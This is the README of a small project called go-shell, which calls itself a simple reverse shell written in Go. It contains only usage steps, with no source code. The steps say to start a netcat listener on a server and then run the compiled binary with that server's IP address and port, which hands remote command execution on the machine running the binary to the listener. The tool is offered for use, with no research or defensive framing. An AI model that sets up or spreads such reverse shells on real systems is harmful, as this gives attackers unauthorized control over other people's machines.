# go-shell
Simple, stupid reverse shell on Golang

# How to use
* Compile
* On server side you must run a listener for example (nc -vl 9999)
* Run binary file and set server ip and server port as arguments (ex. ./my-shell 192.168.0.1 9999)
* At now you can execute command on server, and their commands will send to remote shell, and answer will send to your server. 
